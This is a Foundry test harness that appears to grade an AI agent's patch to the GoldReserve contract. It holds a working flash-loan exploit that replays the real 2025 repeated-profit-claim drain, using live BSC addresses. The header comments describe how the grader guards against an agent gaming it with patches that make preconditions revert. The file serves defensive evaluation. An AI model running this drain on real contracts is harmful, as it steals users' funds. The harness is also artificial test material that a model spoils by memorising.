// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// HARNESS FILE — hash-locked, read-only. The agent must NOT edit this file.
// PoC for the GoldReserve repeated-profit-claim drain (BSC, 2025-02).
// Adapted from DeFiHackLabs src/test/2025-02/GoldReserve_exp.sol.
//
// State-replay model: forks TASK_FORK_URL (the fail-closed record/replay proxy) at the
// incident block and vm.etch'es the code compiled from src/contracts/Token.sol onto the
// live GoldReserve address, so the agent's SOURCE governs the exploit while real storage
// (NFT balances, circulatingSupply, mintPrice, the profit accumulator) is preserved.
//
// ---------------------------------------------------------------------- phase discipline
// The grader credits "exploit blocked" when this test fails for a reason the task DECLARES
// in tests/manifest.json (recognised_block_reasons). Forge reports one reason per test with
// no idea which statement produced it, so a failure ANYWHERE in this body could otherwise
// impersonate the block. The shape to guard against: a patch that leaves the vulnerability
// intact and only makes a PRECONDITION view revert with a recognised string would otherwise
// read as a blocked exploit.
//
// The whole attack runs inside pancakeV3FlashCallback, so the discipline lives there. It is
// in three phases, and only PHASE 1 — the repeated claims and the rotations that carry them
// — plus the final profit assertion may produce a recognised reason:
//
//   phase 0  preconditions and setup: mintPrice() is read through a try/catch, and
//            depositProfit()/mint() are wrapped, so a patch that makes any of them revert
//            (with "Nada a reclamar" or anything else) yields PRECONDITION_UNREADABLE: /
//            PRECONDITION_NOT_MET: — strings no recognised pattern matches.
//   phase 1  the exploit step: claim, walk the same NFTs to a fresh address, claim again.
//            A correct patch carries the claim debt with the tokens, so the very first
//            claim has nothing to pay and reverts with "Nada a reclamar".
//   phase 2  post-drain monetisation: repaying the flash loan. Assessed for this task and
//            wrapped for the same reason mcai's is, even though none of the three recognised
//            reasons is reachable from it — WBNB and the Pancake V3 pool are not patchable,
//            so their revert strings cannot be chosen by a patch. Wrapping still turns "the
//            claims did not cover the loan" into a typed POST_DRAIN_FAILURE: instead of a
//            bare EvmError, which is the honest description of that outcome.
//
// None of PRECONDITION_UNREADABLE, PRECONDITION_NOT_MET or POST_DRAIN_FAILURE matches any
// recognised or infrastructure pattern, so such a failure lands as
// `inconclusive / unrecognised_failure` for a human instead of as reward.

import "forge-std/Test.sol";

interface IGoldReserve {
    function mintPrice() external view returns (uint256);
    function balanceOf(address account, uint256 id) external view returns (uint256);
    function depositProfit() external payable;
    function mint(uint256 id, uint256 amount) external payable;
    function claimProfit() external;
    function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes calldata data) external;
}

interface IWBNB {
    function deposit() external payable;
    function withdraw(uint256) external;
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeV3Pool {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

contract GoldReserve_PoC is Test {
    address constant VICTIM = 0x7c77576a2b48504EBD9fF0810D799651f68742d3;
    address constant FLASH_POOL = 0x172fcD41E0913e95784454622d1c3724f546f849;   // Pancake V3 WBNB pool
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    uint256 constant FORK_BLOCK = 46278330;

    uint256 constant FLASH_AMOUNT = 120 ether;
    uint256 constant NFT_ID = 10;          // untouched id at this block: room for 40 copies
    uint256 constant NFT_AMOUNT = 8;
    uint256 constant ROTATIONS = 21;
    // The real incident netted 12.74 BNB.
    uint256 constant PROFIT_THRESHOLD = 12 ether;

    IGoldReserve gold = IGoldReserve(VICTIM);

    function setUp() public {
        string memory url = vm.envOr("TASK_FORK_URL", string("bsc"));
        try vm.createSelectFork(url, FORK_BLOCK) { } catch { vm.createSelectFork(url); }
        vm.etch(VICTIM, vm.getDeployedCode("Token.sol:GoldReserve"));
        vm.deal(address(this), 0);
    }

    function testExploit() public {
        IPancakeV3Pool(FLASH_POOL).flash(address(this), 0, FLASH_AMOUNT, "");
        uint256 profit = address(this).balance;
        emit log_named_decimal_uint("Attacker BNB profit", profit, 18);
        // EXPLOIT ORACLE: passes iff the attack is profitable. A correct patch carries the
        // claim debt with the NFTs, so the very first claim has nothing to pay and the
        // whole flash-loan transaction unwinds — this test then fails, which is the signal.
        assertGt(profit, PROFIT_THRESHOLD, "exploit did not yield profit (patched?)");
    }

    function pancakeV3FlashCallback(uint256, uint256 fee1, bytes calldata) external {
        require(msg.sender == FLASH_POOL, "pool only");
        IWBNB(WBNB).withdraw(FLASH_AMOUNT);

        // ---- phase 0: preconditions and setup. Deposit the borrowed BNB as "profit", THEN
        // mint NFTs that instantly own it. Every call into the patched contract here is a
        // precondition: its failure says nothing about whether the vulnerability was fixed.
        uint256 mintCost = _readMintPrice() * NFT_AMOUNT;
        if (mintCost >= FLASH_AMOUNT) {
            revert("PRECONDITION_NOT_MET: mint price exceeds the flash-loaned amount");
        }
        try gold.depositProfit{value: FLASH_AMOUNT - mintCost}() { } catch {
            revert("PRECONDITION_NOT_MET: depositProfit() reverted");
        }
        address holder = _holder(0);
        payable(holder).transfer(mintCost);
        vm.prank(holder);
        try gold.mint{value: mintCost}(NFT_ID, NFT_AMOUNT) { } catch {
            revert("PRECONDITION_NOT_MET: mint() reverted");
        }
        if (_readNftBalance(holder) != NFT_AMOUNT) {
            revert("PRECONDITION_NOT_MET: the minted NFTs were not credited");
        }

        // ---- phase 1: THE EXPLOIT STEP. Claim, then walk the SAME NFTs through fresh
        // addresses and claim again each time: the claim record is per address, so every new
        // holder starts at zero. These statements — and only these — may produce a
        // recognised block reason; a correct patch stops the very first claim.
        _claimAndSweep(holder);
        for (uint256 i = 0; i < ROTATIONS; i++) {
            address next = _holder(i + 1);
            vm.prank(holder);
            gold.safeTransferFrom(holder, next, NFT_ID, NFT_AMOUNT, "");
            _claimAndSweep(next);
            holder = next;
        }
        address last = _holder(100);
        vm.prank(holder);
        gold.safeTransferFrom(holder, last, NFT_ID, 1, "");
        _claimAndSweep(last);

        // ---- phase 2: post-drain monetisation — repay the flash loan. The claims have
        // already happened, so a failure here is not evidence of a repair.
        uint256 repay = FLASH_AMOUNT + fee1;
        if (address(this).balance < repay) {
            revert("POST_DRAIN_FAILURE: the claimed BNB does not cover the flash-loan repayment");
        }
        try IWBNB(WBNB).deposit{value: repay}() { } catch {
            revert("POST_DRAIN_FAILURE: WBNB deposit reverted after a successful drain");
        }
        try IWBNB(WBNB).transfer(FLASH_POOL, repay) returns (bool ok) {
            if (!ok) revert("POST_DRAIN_FAILURE: WBNB transfer returned false");
        } catch {
            revert("POST_DRAIN_FAILURE: WBNB transfer reverted after a successful drain");
        }
    }

    /// Precondition read. A sabotaged view is an unreadable precondition, never a block.
    function _readMintPrice() private view returns (uint256) {
        try gold.mintPrice() returns (uint256 v) {
            return v;
        } catch {
            revert("PRECONDITION_UNREADABLE: mintPrice() view reverted");
        }
    }

    function _readNftBalance(address who) private view returns (uint256) {
        try gold.balanceOf(who, NFT_ID) returns (uint256 v) {
            return v;
        } catch {
            revert("PRECONDITION_UNREADABLE: balanceOf() view reverted");
        }
    }

    function _holder(uint256 index) private pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked("GoldReserve holder", index)))));
    }

    function _claimAndSweep(address holder) private {
        vm.prank(holder);
        gold.claimProfit();
        uint256 claimed = holder.balance;
        if (claimed > 0) {
            vm.prank(holder);
            (bool ok,) = payable(address(this)).call{value: claimed}("");
            require(ok, "sweep failed");
        }
    }

    receive() external payable {}
}
